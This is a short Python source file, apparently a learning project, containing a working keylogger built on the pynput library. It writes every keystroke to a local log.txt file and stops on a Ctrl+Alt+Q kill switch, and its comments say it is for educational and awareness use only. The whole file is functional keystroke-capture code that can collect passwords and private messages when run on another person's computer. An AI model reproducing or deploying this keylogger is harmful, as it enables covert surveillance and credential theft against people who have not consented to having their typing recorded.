# ⚠️ Educational Use Only
# This keylogger is created strictly for cybersecurity awareness and ethical learning.
# Do not use this script for any unauthorized activity.

from pynput import keyboard

log_file = "log.txt"
pressed_keys = set()

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

    # Track keys for kill combo
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pressed_keys.add("ctrl")
    if key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        pressed_keys.add("alt")
    if hasattr(key, 'char') and key.char == 'q':
        pressed_keys.add('q')

    # Kill switch: Ctrl + Alt + Q
    if "ctrl" in pressed_keys and "alt" in pressed_keys and "q" in pressed_keys:
        print("Kill switch activated. Exiting keylogger.")
        return False  # Stop listener

def on_release(key):
    # Clear released keys from set
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pressed_keys.discard("ctrl")
    if key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        pressed_keys.discard("alt")
    if hasattr(key, 'char') and key.char == 'q':
        pressed_keys.discard('q')

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
